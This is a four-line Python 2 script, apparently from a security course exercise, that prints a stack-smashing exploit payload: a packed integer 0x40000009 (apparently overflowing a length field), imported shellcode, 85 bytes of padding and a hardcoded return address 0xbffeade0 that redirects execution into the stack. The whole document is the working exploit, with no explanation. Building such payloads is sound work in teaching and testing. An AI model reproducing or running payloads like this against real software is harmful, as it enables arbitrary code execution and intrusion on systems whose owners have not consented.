from shellcode import shellcode
from struct import pack

print pack("<I", 0x40000009)+shellcode+"0"*85+pack("<I", 0xbffeade0)
